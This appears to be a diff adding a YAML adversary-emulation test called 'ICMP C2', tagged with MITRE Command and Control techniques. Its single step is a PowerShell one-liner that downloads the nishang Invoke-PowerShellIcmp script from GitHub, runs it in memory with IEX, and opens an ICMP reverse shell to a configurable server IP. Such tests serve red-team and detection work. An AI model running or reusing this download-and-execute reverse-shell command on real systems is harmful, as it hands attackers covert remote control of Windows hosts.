@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: ICMP C2
+description: |
+    This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener
+    refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
+args:
+    - name: server_ip
+      type: string
+      default: 127.0.0.1
+uuid: 0268e63c-e244-42db-bef7-72a9e59fc1fc
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1095: Non-Application Layer Protocol'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: icmp-c2
+      inline: |
+        IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+        Invoke-PowerShellIcmp -IPAddress {{.Args.server_ip}}
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
